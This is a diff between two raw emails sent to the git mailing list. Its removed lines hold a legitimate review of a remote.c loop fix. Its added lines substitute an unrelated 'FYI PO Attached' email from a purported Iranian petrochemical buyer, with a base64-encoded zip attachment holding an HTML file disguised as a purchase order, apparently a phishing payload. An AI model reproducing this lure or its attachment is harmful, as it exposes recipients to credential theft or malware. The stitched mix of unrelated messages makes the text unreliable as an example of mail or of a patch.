@@ -2,158 +2,122 @@ Return-Path: <git-owner@kernel.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by smtp.lore.kernel.org (Postfix) with ESMTP id 5F398C433EF
-	for <git@archiver.kernel.org>; Thu, 16 Jun 2022 13:33:06 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTP id BEFBEC433EF
+	for <git@archiver.kernel.org>; Thu, 16 Jun 2022 13:33:17 +0000 (UTC)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S233016AbiFPNdD (ORCPT <rfc822;git@archiver.kernel.org>);
-        Thu, 16 Jun 2022 09:33:03 -0400
-Received: from lindbergh.monkeyblade.net ([23.128.96.19]:37492 "EHLO
+        id S1376631AbiFPNdQ (ORCPT <rfc822;git@archiver.kernel.org>);
+        Thu, 16 Jun 2022 09:33:16 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:37738 "EHLO
         lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S229723AbiFPNdB (ORCPT <rfc822;git@vger.kernel.org>);
-        Thu, 16 Jun 2022 09:33:01 -0400
-Received: from mail-ej1-x634.google.com (mail-ej1-x634.google.com [IPv6:2a00:1450:4864:20::634])
-        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 8EF8513F0A
-        for <git@vger.kernel.org>; Thu, 16 Jun 2022 06:32:56 -0700 (PDT)
-Received: by mail-ej1-x634.google.com with SMTP id o7so2843872eja.1
-        for <git@vger.kernel.org>; Thu, 16 Jun 2022 06:32:56 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20210112;
-        h=from:to:cc:subject:date:references:user-agent:in-reply-to
-         :message-id:mime-version;
-        bh=480BPN4ELFjCrM/pPcOuieBKWzluu9bNmesnS7EJlIg=;
-        b=iNCChmF+npevItGGnmvjhCKt12tTsbcNprIQrw2u2bW8wgLw0kKX+oMCXThXXOkxle
-         hvssFIcNx/HlU7waE9HngKzhF+xk9EK9W3h/z9Ik2eYgw/eLBpvnpPrGXvjkynR5zA65
-         bW07FV0qITo+thxJ6bhDIav5Z+81zPsuDB3IvT4Py6ZvzA3YPieD8gOz6XWuL5GLpwS3
-         n2Uuuss1BGKVTtTasZl/3P/WGCXVJCVUoY6235uMNKysIKG/eeU0DjaAFFhh7hRshEVD
-         mFdDHHdzmwP4J3PtEpnU4J+6ePDbdP8HzC/W50xIglhdWuQTntiW9j61wBRkpN+GoXTp
-         bC5w==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=x-gm-message-state:from:to:cc:subject:date:references:user-agent
-         :in-reply-to:message-id:mime-version;
-        bh=480BPN4ELFjCrM/pPcOuieBKWzluu9bNmesnS7EJlIg=;
-        b=MXdkwS7zFl89nINIDGQOz+t7kUKv1a0pBDH5GR4s4KQ/d0VOWTjlKtaRAcFoGScRCy
-         VqebRDPETpH1DYcTG3Y7L5A946kuL+MUeqam/5DCd1h8ncwTK/OnWIuDPAzcC/C5flcp
-         wxTQ/KYWnEBEmy9M9p6y2kbPgABiNzJM32mUGTaUD3jMBgJS6Vgj4IB5KxJ97Zch7ja7
-         Jz9nVR7HVJG7P/9D2MCjbtwjjBwU+rjFcsyNqRrb20bumY723cpv/XwKsR8bTBM6D7VH
-         aoB9TAgTLTHN+sntHDgAW7mv5B+SjzjC9ocGScVFQYojgOuk2q8DoBujbcK/3aCzI+bu
-         UuDA==
-X-Gm-Message-State: AJIora+j+iR5GodCjr51Behr5HavTY3UwuiItGDZdafUNvj2X2bBaA4Y
-        9578h4b7KQ3LjPgXWDsBcXo2+HY3P0o=
-X-Google-Smtp-Source: AGRyM1uK+fiwuCYnB00dUrSC//X5f0qvHZmomVoahpnfd6nhemMDJNDXOvrrIKc8brIi1R9CMfcSKg==
-X-Received: by 2002:a17:907:80ca:b0:70f:77fd:cfbd with SMTP id io10-20020a17090780ca00b0070f77fdcfbdmr4481357ejc.82.1655386375062;
-        Thu, 16 Jun 2022 06:32:55 -0700 (PDT)
-Received: from gmgdl (dhcp-077-248-183-071.chello.nl. [77.248.183.71])
-        by smtp.gmail.com with ESMTPSA id e25-20020a056402089900b0042be14040c1sm1844341edy.86.2022.06.16.06.32.54
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 16 Jun 2022 06:32:54 -0700 (PDT)
-Received: from avar by gmgdl with local (Exim 4.95)
-        (envelope-from <avarab@gmail.com>)
-        id 1o1pcE-0014cb-1N;
-        Thu, 16 Jun 2022 15:32:54 +0200
-From:   =?utf-8?B?w4Z2YXIgQXJuZmrDtnLDsA==?= Bjarmason <avarab@gmail.com>
-To:     Johannes Schindelin via GitGitGadget <gitgitgadget@gmail.com>
-Cc:     git@vger.kernel.org,
-        Johannes Schindelin <johannes.schindelin@gmx.de>
-Subject: Re: [PATCH 10/11] relative_url(): fix incorrect condition
-Date:   Thu, 16 Jun 2022 15:09:38 +0200
-References: <pull.1264.git.1655336146.gitgitgadget@gmail.com>
- <0bf70e65d2c9e187203a77088ff0f7d18510caca.1655336146.git.gitgitgadget@gmail.com>
-User-agent: Debian GNU/Linux bookworm/sid; Emacs 27.1; mu4e 1.7.12
-In-reply-to: <0bf70e65d2c9e187203a77088ff0f7d18510caca.1655336146.git.gitgitgadget@gmail.com>
-Message-ID: <220616.86k09gwx6i.gmgdl@evledraar.gmail.com>
+        with ESMTP id S229723AbiFPNdN (ORCPT <rfc822;git@vger.kernel.org>);
+        Thu, 16 Jun 2022 09:33:13 -0400
+X-Greylist: delayed 334 seconds by postgrey-1.37 at lindbergh.monkeyblade.net; Thu, 16 Jun 2022 06:33:08 PDT
+Received: from mail.efind.com (mail.efind.com [143.244.179.24])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 427D6175B9
+        for <git@vger.kernel.org>; Thu, 16 Jun 2022 06:33:08 -0700 (PDT)
+Received: from localhost (mail.efind.com [127.0.0.1])
+        by mail.efind.com (Postfix) with ESMTP id 5AC40DC20EDE
+        for <git@vger.kernel.org>; Thu, 16 Jun 2022 08:27:34 -0500 (CDT)
+DKIM-Filter: OpenDKIM Filter v2.11.0 mail.efind.com 5AC40DC20EDE
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=efind.com;
+        s=20210531; t=1655386054;
+        bh=J8A03RP2O0vUnlEtrSeOs0DY2+nJ+6K/gBKdTqxHJtU=;
+        h=From:To:Subject:Date:From;
+        b=wU8DY+RhafweE6SolE3jKAn8WTk3ipsLhANvo/+LiYzZDYZYm390nhay0DFSPRb1r
+         h7OCXfp3D6Qk79MmjnqBsbHBPGTtcJINIdDkWUAsFLfuiOgwzANAuehg54aAs8FLkS
+         ptQvT8YIi/LBIhZ5on1wIpmDrcq5ivyQjUrrhsWIHzjCGTycPypgACtraC/szU1WnT
+         XygcpCV0migcUBrRAoVAvNgf0YkIiPioT36rSEsJ+OBZURJZ1zJIRJbrpA3bVLaL4h
+         yYKgkbQmOONFLl49ERbsTwOSlJEjrI7H4D84Phyq15KxOLEJ+04KOSuJPZ9MP8FihJ
+         vPP/qJC2ishDg==
+X-Virus-Scanned: amavisd-new at efind.com
+Received: from mail.efind.com ([127.0.0.1])
+        by localhost (mail.efind.com [127.0.0.1]) (amavisd-new, port 10024)
+        with ESMTP id 4Vqi1PRxb_Gg for <git@vger.kernel.org>;
+        Thu, 16 Jun 2022 08:27:33 -0500 (CDT)
+Received: from efind.com (unknown [105.112.212.173])
+        (using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+        (No client certificate requested)
+        (Authenticated sender: efind.com/jswcon)
+        by mail.efind.com (Postfix) with ESMTPSA id 14349DC20ED6
+        for <git@vger.kernel.org>; Thu, 16 Jun 2022 08:27:31 -0500 (CDT)
+DKIM-Filter: OpenDKIM Filter v2.11.0 mail.efind.com 14349DC20ED6
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=efind.com;
+        s=20210531; t=1655386053;
+        bh=J8A03RP2O0vUnlEtrSeOs0DY2+nJ+6K/gBKdTqxHJtU=;
+        h=From:To:Subject:Date:From;
+        b=Q4j1AzJ8hfEcjg1Aq8teH2s53BU9/KVM7ldFiNIbKzJt9Q3lAstg+VcM4+ZPKRp5J
+         rU5lNh9imckEBTqmJD+0DAnxFy6jps5paZ1+G+LTNFQaag3Ni9O/O6ZnF2h09F4vzP
+         ebL/xfJZeaPo2qSwewocgFtGAo7fUTcRDTYQOYSkhgafrGxgv3IyyI/ASJ9AU2xCzr
+         y7AcAOpW24iiGCJvmOFTHeakMG8DesZEnkJpr9+DE6l9GO78fpNx5pw9TJZJhzDNMb
+         srkdBPq0oaX6VEZEq7KPkPn95lfjD1nuSQrRsAzIGfAifWo4czpYM9F8e82atGsN97
+         kVio4lgLqoWWA==
+From:   Iulia Moraru <jswcon@efind.com>
+To:     git@vger.kernel.org
+Subject: FYI PO Attached
+Date:   16 Jun 2022 21:27:30 +0800
+Message-ID: <20220616210425.83CD0621AC5EDAE7@efind.com>
 MIME-Version: 1.0
-Content-Type: text/plain
+Content-Type: multipart/mixed;
+        boundary="----=_NextPart_000_0012_8F877F94.18E77699"
 Precedence: bulk
 List-ID: <git.vger.kernel.org>
 X-Mailing-List: git@vger.kernel.org
 
+This is a multi-part message in MIME format.
 
-On Wed, Jun 15 2022, Johannes Schindelin via GitGitGadget wrote:
+------=_NextPart_000_0012_8F877F94.18E77699
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
 
-> From: Johannes Schindelin <johannes.schindelin@gmx.de>
->
-> In 63e95beb085c (submodule: port resolve_relative_url from shell to C,
-> 2016-04-15), we added a loop over `url` where we are looking for `../`
-> or `./` components.
->
-> The loop condition we used is the pointer `url` itself, which is clearly
-> not what we wanted.
+Dear Sir,
 
-Clearly, but having looked at this I think it's useful to note that
-coverity must be (I don't know what it actually emitted) be complaining
-about the "url" condition being useless, i.e. it's the same as a "while
-(1)", not that we run off the end of the string.
+As per attached please find the revised PO (Signed & Stamped) and=20
+let me have your signed & Stamped one, also I need to have your=20
+PI to proceed the advance payment to active the PO. Please sign=20
+and stamp the technical DS accordingly. I will send you 100%=20
+payment as soon as I receive your PI.
 
-I.e. due to the way those start_with*() functions work we would abort
-early if we were running off th end of the string.
+Best Regards
+Ms.Iulia Moraru,
+Jam Petrochemical Company
+N0.27, Nezami St,Tavanir Ave.,
+Tehran 14348-43145 , Iran
+Tel : 88654545  Ex: 384
+------=_NextPart_000_0012_8F877F94.18E77699
+Content-Type: application/zip; name="attachments.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="attachments.zip"
 
-> Pointed out by Coverity.
->
-> Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>
-> ---
->  remote.c | 2 +-
->  1 file changed, 1 insertion(+), 1 deletion(-)
->
-> diff --git a/remote.c b/remote.c
-> index 9b9bbfe80ec..bded6acbfe8 100644
-> --- a/remote.c
-> +++ b/remote.c
-> @@ -2846,7 +2846,7 @@ char *relative_url(const char *remote_url, const char *url,
->  	 * When the url starts with '../', remove that and the
->  	 * last directory in remoteurl.
->  	 */
-> -	while (url) {
-> +	while (*url) {
->  		if (starts_with_dot_dot_slash_native(url)) {
->  			url += 3;
->  			colonsep |= chop_last_dir(&remoteurl, is_relative);
+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
 
-Which I tested with this:
-	
-	diff --git a/remote.c b/remote.c
-	index 9b9bbfe80ec..e049bbb791c 100644
-	--- a/remote.c
-	+++ b/remote.c
-	@@ -2846,14 +2846,17 @@ char *relative_url(const char *remote_url, const char *url,
-	 	 * When the url starts with '../', remove that and the
-	 	 * last directory in remoteurl.
-	 	 */
-	-	while (url) {
-	+	while (1) {
-	 		if (starts_with_dot_dot_slash_native(url)) {
-	 			url += 3;
-	 			colonsep |= chop_last_dir(&remoteurl, is_relative);
-	-		} else if (starts_with_dot_slash_native(url))
-	+		} else if (starts_with_dot_slash_native(url)) {
-	 			url += 2;
-	-		else
-	-			break;
-	+		} else if (!*url) {
-	+			BUG("ran off the end of our url?");
-	+		} else {
-	+			break; 
-	+		}
-	 	}
-	 	strbuf_reset(&sb);
-	 	strbuf_addf(&sb, "%s%s%s", remoteurl, colonsep ? ":" : "/", url);
-	
-Which will fail e.g. on this test in t3420-rebase-autostash.sh:
 
-	+ git submodule add ./ sub
-	BUG: remote.c:2856: ran off the end of our url?
-	Aborted
-
-I worried a bit about this since we released this with v2.9.0, so in all
-this time we haven't been infinitely looping on this case, or at least
-haven't had any reports about that.
-
-So if we hadn't been catching this in starts_with_*() I wouldn't be
-confident that this was the correct fix, yes it's almost certainly not
-what not what was intended, but if we change it to that are we confident
-that the side-effects are going to be what we want?
-
-But in this case I'm pretty sure that the behavior before/after will be
-the same, and that the only change will be to make coverity happier, and
-the code less confusing.
+------=_NextPart_000_0012_8F877F94.18E77699--
 
